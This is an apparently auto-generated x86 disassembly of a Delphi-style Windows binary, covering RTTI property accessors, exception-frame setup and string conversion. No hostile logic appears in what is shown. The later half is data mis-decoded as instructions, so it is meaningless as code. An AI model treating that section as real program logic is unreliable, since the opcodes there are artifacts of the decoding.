movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0xc ]
mov edx edi
call sub_4072f8
mov ecx [ ebp - 0xc ]
mov edx ebx
mov eax esi
call sub_423df4
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b81
lea eax [ ebp - 0x10 ]
mov edx 0x2
call j_sub_4068c4
retn
dec al
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
sub al 0x7
je r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_406d90
jmp r-xdata
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_4072f8
mov ecx [ ebp - 0x10 ]
mov edx ebx
mov eax esi
call sub_423df4
jmp r-xdata
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_423b88
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423c90
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea ecx [ ebp - 0x10 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4238f0
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4072ac
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423c97
lea eax [ ebp - 0x14 ]
call sub_406d54
lea eax [ ebp - 0x10 ]
call sub_4068a0
retn
dec al
je r-xdata
lea ecx [ ebp - 0x14 ]
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_423978
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4072f8
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ ebx + 0x4 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx [ ebp - 0x4 ]
mov eax esi
mov edx [ ebx ]
call sub_4070a8
jmp r-xdata
mov eax esi
xor edx edx
call sub_4070a8
mov [ ebp - 0xc ] eax
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0xc ] eax
jmp r-xdata
mov ecx esi
mov edx [ ebx + 0x10 ]
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov edx esi
mov eax [ ebp - 0x8 ]
call [ ebp - 0xc ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
cmp [ ebx + 0x10 ] 0x80000000
jne r-xdata
sub_423ca0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call j_sub_406bfc
xor eax eax
push ebp
push sub_423de6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
mov eax [ eax ]
call sub_422f98
mov ebx eax
cmp [ ebx ] 0x0
je r-xdata
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x4 ]
mov ecx 0x0
call sub_4072d4
mov ecx [ ebp - 0x14 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_42393c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
push edi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push 0x0
movzx eax [ ebx ]
push eax
call WideCharToMultiByte
mov [ ebp - 0x10 ] eax
lea eax [ ebp - 0x8 ]
xor ecx ecx
mov edx [ ebp - 0x10 ]
call sub_406c8c
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
mov edi eax
test edi edi
je r-xdata
mov edx eax
sub edx 0xa
cmp [ edx ] 0x2
je r-xdata
push 0x0
push 0x0
mov eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x8 ]
call sub_406c0c
push eax
push edi
mov eax [ ebp - 0x4 ]
call sub_407134
push eax
push 0x0
movzx eax [ ebx ]
push eax
call WideCharToMultiByte
lea eax [ ebp - 0x8 ]
xor ecx ecx
movzx edx [ ebx ]
call sub_407b2c
mov ecx [ ebp - 0x8 ]
mov edx esi
mov eax [ ebp - 0xc ]
call sub_42393c
jmp r-xdata
sub edi 0x4
mov edi [ edi ]
lea eax [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
call sub_406a50
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423ded
lea eax [ ebp - 0x14 ]
call sub_4068a0
lea eax [ ebp - 0x8 ]
call sub_4068a0
lea eax [ ebp - 0x4 ]
call j_sub_4068a0
retn
sub_423df4
push ebp
mov ebp esp
add esp 0xfffffef4
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10c ] ebx
mov edi ecx
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_423f07
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov eax [ eax ]
movzx eax [ eax ]
sub al 0x5
je r-xdata
lea eax [ ebp - 0x108 ]
mov edx edi
mov ecx 0xff
call sub_407334
lea ecx [ ebp - 0x108 ]
mov edx ebx
mov eax esi
call sub_423638
jmp r-xdata
sub al 0x5
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423f0e
lea eax [ ebp - 0x10c ]
call sub_406d54
retn
mov ecx edi
mov edx ebx
mov eax esi
call sub_423ca0
jmp r-xdata
dec al
je r-xdata
lea eax [ ebp - 0x10c ]
mov edx edi
call sub_40730c
mov ecx [ ebp - 0x10c ]
mov edx ebx
mov eax esi
call sub_423a8c
jmp r-xdata
sub al 0x7
je r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
jmp r-xdata
cmp edx 0xfe000000
jne r-xdata
mov ebx eax
and ebx 0xffffff
add ebx esi
mov eax ebx
mov edx edi
call sub_4070a8
jmp r-xdata
mov [ ebp - 0x8 ] eax
mov edx [ esi ]
movsx eax ax
add edx eax
mov eax [ edx ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov ecx edi
mov edx eax
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
mov edx edi
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] esi
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_423f18
push ebx
push esi
add esp 0xffffffec
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov esi edx
and esi 0xffffff
add esi eax
mov eax [ ebx ]
mov eax [ eax ]
call sub_422f98
movzx eax [ eax ]
cmp eax 0x4
ja r-xdata
mov [ esp + 0xc ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0xc ] edx
jmp r-xdata
xor eax eax
mov [ esp ] eax
mov [ esp + 0x4 ] eax
mov [ esp + 0x8 ] ax
jmp r-xdata
jmp [ eax * 4 + jump_table_423f58 ]
mov edx eax
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp + 0x10 ]
call [ esp + 0xc ]
fstp [ esp ]
fwait
jmp r-xdata
mov [ esp + 0x10 ] eax
mov eax [ ebx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
fld [ esp ]
add esp 0x14
pop esi
pop ebx
retn
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
mov eax [ esi ]
mov [ esp ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
mov ax [ esi + 0x8 ]
mov [ esp + 0x8 ] ax
jmp r-xdata
fild [ esi ]
fstp [ esp ]
fwait
jmp r-xdata
fild [ esi ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
jmp r-xdata
fld [ esp ]
fdiv [ r-xdata ]
fstp [ esp ]
fwait
mov eax [ ebx ]
mov eax [ eax ]
call sub_422f98
cmp [ eax ] 0x4
jne r-xdata
sub_424030
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov ebx [ esi + 0x8 ]
mov eax [ esi ]
mov eax [ eax ]
call sub_422f98
movzx eax [ eax ]
mov edx ebx
and edx 0xff000000
cmp edx 0xff000000
jne r-xdata
cmp edx 0xfe000000
jne r-xdata
mov edx ebx
and edx 0xffffff
add edx edi
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x8 ] ebx
mov edx [ edi ]
movsx ecx bx
add edx ecx
mov edx [ edx ]
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
jmp [ eax * 4 + jump_table_424079 ]
and eax 0x7f
cmp eax 0x4
ja r-xdata
and eax 0x7f
cmp eax 0x4
ja r-xdata
mov [ ebp - 0x4 ] edi
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fstp [ edx ]
fwait
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov [ edx + 0x4 ] eax
mov ax [ ebp + 0x10 ]
mov [ edx + 0x8 ] ax
jmp r-xdata
fld [ ebp + 0x8 ]
fistp [ edx ]
fwait
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
fistp [ edx ]
fwait
jmp r-xdata
jmp [ eax * 4 + jump_table_4241a8 ]
jmp [ eax * 4 + jump_table_424115 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
fld [ ebp + 0x8 ]
add esp 0xfffffffc
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fstp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
movzx eax [ ebp + 0x10 ]
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
fld [ ebp + 0x8 ]
fmul [ r-xdata ]
add esp 0xfffffff8
fistp [ esp ]
fwait
mov eax [ ebp - 0x4 ]
call [ ebp - 0x8 ]
jmp r-xdata
sub_42423c
push esi
push edi
mov edi edx
mov edx [ edi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov esi [ edi + 0x4 ]
cmp [ edi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and esi 0xffffff
lea edx [ esi + eax ]
mov eax ecx
call sub_424228
pop edi
pop esi
retn
jb r-xdata
call esi
pop edi
pop esi
retn
movsx esi si
add esi [ eax ]
call [ esi ]
pop edi
pop esi
retn
sub_42427c
push esi
push edi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov edi [ esi + 0x8 ]
cmp [ esi + 0xb ] 0xfe
ja r-xdata
mov edx ecx
and edi 0xffffff
add eax edi
mov edx ecx
call sub_424228
pop edi
pop esi
retn
jb r-xdata
call edi
pop edi
pop esi
retn
movsx edi di
add edi [ eax ]
call [ edi ]
pop edi
pop esi
retn
sub_4242bc
push ebx
push esi
mov esi edx
mov edx [ esi + 0x10 ]
cmp edx 0x80000000
jne r-xdata
mov ebx [ esi + 0x4 ]
cmp [ esi + 0x7 ] 0xfe
ja r-xdata
mov edx ecx
and ebx 0xffffff
add eax ebx
mov edx [ eax ]
mov ebx [ eax + 0x4 ]
mov [ ecx ] edx
mov [ ecx + 0x4 ] ebx
pop esi
pop ebx
retn
jb r-xdata
call ebx
pop esi
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop esi
pop ebx
retn
sub_4242fc
push ebx
mov ebx [ edx + 0x8 ]
cmp [ edx + 0xb ] 0xfe
ja r-xdata
and ebx 0xffffff
add eax ebx
mov edx [ ecx ]
mov ebx [ ecx + 0x4 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
pop ebx
retn
mov edx [ edx + 0x10 ]
push [ ecx + 0x4 ]
push [ ecx ]
jb r-xdata
call ebx
pop ebx
retn
movsx ebx bx
add ebx [ eax ]
call [ ebx ]
pop ebx
retn
sub_424334
cmp [ edx + 0x7 ] 0xfe
mov ecx [ edx + 0x4 ]
mov edx [ edx + 0x10 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ eax + 0x4 ]
mov eax [ eax ]
retn
jb r-xdata
call ecx
retn
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
retn
sub_42435c
push ebp
mov ebp esp
cmp [ edx + 0xb ] 0xfe
mov ecx [ edx + 0x8 ]
ja r-xdata
and ecx 0xffffff
add eax ecx
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
mov edx [ edx + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
jb r-xdata
call ecx
jmp r-xdata
movsx ecx cx
add ecx [ eax ]
call [ ecx ]
jmp r-xdata
pop ebp
retn 0x8
sub_424398
push ebx
push esi
add esp 0xfffffff4
mov [ esp ] ecx
mov ebx edx
mov edx [ ebx + 0x4 ]
mov ecx edx
and ecx 0xff000000
cmp ecx 0xff000000
jne r-xdata
cmp ecx 0xfe000000
jne r-xdata
mov ebx edx
and ebx 0xffffff
add ebx eax
mov eax [ esp ]
mov edx [ ebx ]
call sub_409ccc
jmp r-xdata
mov [ esp + 0x4 ] edx
mov ecx [ eax ]
movsx edx dx
add ecx edx
mov edx [ ecx ]
mov [ esp + 0x4 ] edx
jmp r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov ecx [ esp ]
mov edx esi
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
mov edx [ esp ]
mov eax [ esp + 0x8 ]
call [ esp + 0x4 ]
jmp r-xdata
mov [ esp + 0x8 ] eax
mov esi [ ebx + 0x10 ]
cmp esi 0x80000000
jne r-xdata
sub_424418
push ebx
push esi
add esp 0xfffffff8
mov esi ecx
mov ecx [ edx + 0x8 ]
mov ebx ecx
and ebx 0xff000000
cmp ebx 0xff000000
jne r-xdata
cmp ebx 0xfe000000
jne r-xdata
mov ebx ecx
and ebx 0xffffff
add ebx eax
mov eax ebx
mov edx esi
call sub_409ccc
jmp r-xdata
mov [ esp ] ecx
mov ebx [ eax ]
movsx ecx cx
add ebx ecx
mov ecx [ ebx ]
mov [ esp ] ecx
jmp r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov ecx esi
mov edx eax
mov eax [ esp + 0x4 ]
call [ esp ]
mov edx esi
mov eax [ esp + 0x4 ]
call [ esp ]
jmp r-xdata
mov [ esp + 0x4 ] eax
mov eax [ edx + 0x10 ]
cmp eax 0x80000000
jne r-xdata
sub_42448c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4244d2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4244d9
retn
mov eax rw-data
mov ecx 0x2
mov edx [ r-xdata ]
call sub_407e40
mov eax rw-data
call j_sub_4068a0
sub_4251a4
inc [ edi ]
in al 0x10
inc eax
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
lea eax [ eax ]
mov eax 0x15004251
adc [ esp + ecx * 2 + 0x69 ] dl
jae r-xdata
add [ eax ] bh
push edx
push ebx
outsd
jb r-xdata
imul esi [ ecx + 0x75 ] 0x6c430765
popad
jae r-xdata
jae r-xdata
add [ ebx ] al
or eax 0x73694c54
je r-xdata
inc ebx
outsd
insd
jo r-xdata
js r-xdata
jae r-xdata
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
imul esp [ edi + 0x6e ] 0x1704f
add [ eax ] al
add [ 0x34000000 ] al
push edx
inc edx
add [ esi ] al
insb
popad
inc ebx
outsd
jo r-xdata
jae r-xdata
jb r-xdata
fcomp [ edx + 0x42 ]
add [ eax ] cl
add [ eax ] al
add [ 0x73694c46 ] al
je r-xdata
add [ eax ] al
call sub_4294e7
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
push ebx
inc edx
add al ch
push edx
inc edx
add [ ebx ] dl
push ebx
inc edx
add [ eax ] al
add [ eax ] al
add [ edi ] ch
push ebx
inc edx
add [ eax ] dl
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
fcomp [ eax + 0x40 ]
add eax 0x6e41616c
add al 0x6c
popad
dec edi
jb r-xdata
inc edx
add bh bh
inc [ edx ]
add [ ebp + 0x52380040 ] cl
add al [ eax ]
lea eax [ eax ]
cmp [ edx + 0x42 ] dl
sbb al 0x0
add [ eax ] al
add al [ eax ]
add [ eax ] al
pushfd
adc [ eax ] al
add al [ eax ]
in al 0x10
inc eax
add [ 0x6d657449 ] al
xor [ edx ] eax
add [ eax ] al
in al 0x10
inc eax
add [ 0x6d657449 ] al
xor al [ edx ]
add [ ebp + 0x51f80040 ] cl
inc edx
add [ edi ] cl
adc al 0x54
dec esp
imul esi [ ebx + 0x74 ] 0x74726f53
inc ebx
outsd
insd
jo r-xdata
add [ ebx ] al
add [ edi ] bh
push ebx
inc edx
add [ eax + eax - 0xc ] al
push [ ebx + edx * 2 + 0x42 ]
add [ edx ] al
hlt
add [ eax ] al
or ebp [ ecx + 0x53 ]
insb
popad
pop eax
outsd
jb r-xdata
jb r-xdata
pop eax
inc eax
push ebp
outsb
imul esi [ ecx + 0x75 ] 0x616c0c65
inc esp
jae r-xdata
or al 0x6c
popad
jb r-xdata
insb
popad
push ebx
inc esi
jne r-xdata
add [ eax ] al
push es
inc esi
dec ecx
outsb
js r-xdata
inc eax
add [ eax + eax ] al
push ebp
outsb
arpl [ esp + ebx ] sp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
int3
sub_425b7c
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
fcomp [ ebp + 0x42 ]
add al dl
pop ebx
inc edx
add [ ecx ] dl
pop esp
inc edx
add [ eax ] al
add [ eax ] al
add [ ebp + 0x5c ] dl
inc edx
add [ eax ] ch
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ edi + ecx ] bh
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
fcomp [ edx + 0x42 ]
add [ eax + eax ] al
add [ eax ] al
add eax 0x73694c46
je r-xdata
sub [ esi + 0x80040 ] ch
add [ eax ] al
add eax 0x636f4c46
imul eax [ edx ] 0x0
add [ ecx + edx * 2 ] ch
inc edx
add [ eax ] ah
add [ eax ] al
add [ ebx ] cl
inc esi
inc esp
jne r-xdata
add [ eax ] al
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
daa
add [ edi + ecx ] bh
inc ebx
add [ edi ] al
inc esp
jae r-xdata
insb
imul esp [ ebx + 0x61 ] 0x2736574
add [ eax ] al
add [ eax ] cl
add [ ecx + 0x5c ] ah
inc edx
add [ eax + eax - 0xc ] al
inc [ edi + 0x4d00425c ]
add bh bh
[ esi + 0x4200425c ]
mov [ eax ] dl
inc ebx
add [ eax ] cl
jb r-xdata
inc esp
imul esi [ edx + 0x65 ] 0x6f697463
outsb
add al [ eax ]
add al [ eax ]
sub al [ eax ]
clc
adc [ ebx ] al
or dl [ ebp + 0x6e ]
insb
outsd
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] 0x3
add eax [ eax ]
add [ eax ] al
add [ eax ] al
dec esp
outsd
arpl [ ebx + 0x4c ] bp
imul esi [ ebx + 0x74 ] 0x5adc0003
inc edx
add [ eax ] cl
add [ ecx ] al
add al bl
pop ebp
inc edx
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor al 0x0
pushfd
adc [ ebx ] al
push es
push edx
insd
outsd
jbe r-xdata
add [ eax ] ch
add [ eax + 0x8004310 ] cl
jns r-xdata
mov dl 0x5e
inc edx
add [ eax ] al
add [ eax ] al
add dh al
pop esi
inc edx
add [ eax ] dl
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
popad
dec esp
imul esi [ ebx + 0x74 ] r-xdata
add [ eax + eax * 2 ] bl
add [ eax ] al
add [ edi ] al
inc ebx
insb
popad
jae r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
insd
add al [ eax ]
add al [ eax ]
dec ebx
add [ eax + edx + 0x520a0043 ] ah
insd
outsd
jbe r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
xor [ eax ] eax
mov eax 0x300430f
inc ecx
add eax [ fs : eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add al [ eax ]
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
add al 0x49
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add al bl
pop ebp
inc edx
add [ edx ] al
add ah cl
pop esi
inc edx
add [ ebp ] cl
add [ eax ] al
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ ecx + edx ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
add eax 0x7a695346
add al [ gs : eax ]
add ah ah
adc [ eax ] al
or [ eax ] al
add [ eax ] al
add eax 0x74694246
jae r-xdata
rcr [ eax + 0x40 ] 0x1
jae r-xdata
add [ edi ] al
or edx [ esp + edx * 2 + 0x68 ]
jb r-xdata
add [ edx ] al
add [ ebp + 0x5ddc0040 ] cl
inc edx
dec ecx
je r-xdata
or [ eax ] al
add al [ eax ]
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
add al 0x49
je r-xdata
insd
add al [ eax ]
add al [ eax ]
and eax 0x43104000
add [ 0x61656c43 ] al
jb r-xdata
add [ ecx ] al
add [ edx ] al
or [ esi + 0x42 ] bl
add [ edx ] al
add [ edx ] al
add [ ecx + edx * 2 ] ch
inc edx
add [ eax ] ah
add [ eax ] al
jmp [ eax ]
lea eax [ eax ]
fcomp [ ebp + 0x42 ]
insd
add eax [ eax ]
add [ eax ] al
add [ eax ] al
or [ eax ] al
add eax [ eax ]
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add ah ah
adc [ eax ] al
add [ eax ] eax
add al 0x49
je r-xdata
add [ eax ] al
or [ eax ] al
add [ eax ] eax
fcomp [ ebp + 0x42 ]
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al [ eax ]
sub [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
add [ ecx ] al
add al bl
pop ebp
inc edx
jae r-xdata
insd
add al [ eax ]
add [ eax ] ah
push esp
inc edx
add [ edx ] al
add [ ecx ] cl
pop eax
inc eax
add [ esi + edx * 2 + 0x58b80040 ] dh
inc eax
add [ eax - 0x2fffbfa8 ] dh
jae r-xdata
sub_425f81
pop edi
inc edx
add al ch
pop edi
inc edx
add dh dh
pop edi
inc edx
add [ eax ] cl
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add [ eax - 0x63ffbcee ] ah
adc eax [ ebx ]
movsb [ edi ] [ esi ]
adc eax [ ebx ]
int3
sub_426514
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pop esp
inc dx
add [ eax + 0x65 ] ch
inc edx
add [ ecx + 0x4265 ] bl
add [ eax ] al
add [ ebp + 0x10004265 ] dh
add [ eax ] al
add [ esp + edx ] bh
inc eax
add [ esi + edx * 2 + 0x56b40040 ] ch
inc eax
add [ eax - 0x4fffbfa8 ] bh
pop eax
inc eax
add al dl
pop eax
inc eax
add ah dl
pop eax
inc eax
add al bl
pop eax
inc eax
add ah cl
pop eax
inc eax
add [ eax - 0x5bffbfab ] cl
push ebp
inc eax
add al ah
push ebp
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
pushfd
adc [ eax ] al
add al 0x0
add [ eax ] al
push es
inc esi
dec ecx
outsb
js r-xdata
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] cl
add [ eax ] al
add [ ebx ] cl
inc esi
inc ebx
outsd
insb
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
add al [ eax ]
add [ eax ] al
add eax [ eax ]

add [ eax ] al
sub_4267d9
push eax
push r-xdata
add al [ eax ]
imul eax [ es : edx ] 0x8004a
push ecx
imul eax [ edx ] 0xfff40042
jbe r-xdata
add al [ eax ]
movsb [ edi ] [ esi ]
push 0x42
add [ eax ] al
add [ ebx + edx * 2 ] al
insb
add al [ eax ]
add al dh
inc edx
add [ edx ] al
add [ ecx ] cl
dec ecx
je r-xdata
inc edx
add [ edx ] al
hlt
add [ eax ] cl
add [ ecx ] al
add [ edx + ebp * 2 + 0x42 ] ah
add al 0x53
insb
add al [ eax ]
add al [ eax ]
insd
inc ebx
insb
popad
jae r-xdata
add al 0x53
imul esp [ edi + 0x6e ] 0x3
add al dh
sbb [ ebx ] al
push es
inc ecx
jae r-xdata
add al [ eax ]
add al [ eax ]
daa
add [ eax + ebx + 0x44070043 ] al
jae r-xdata
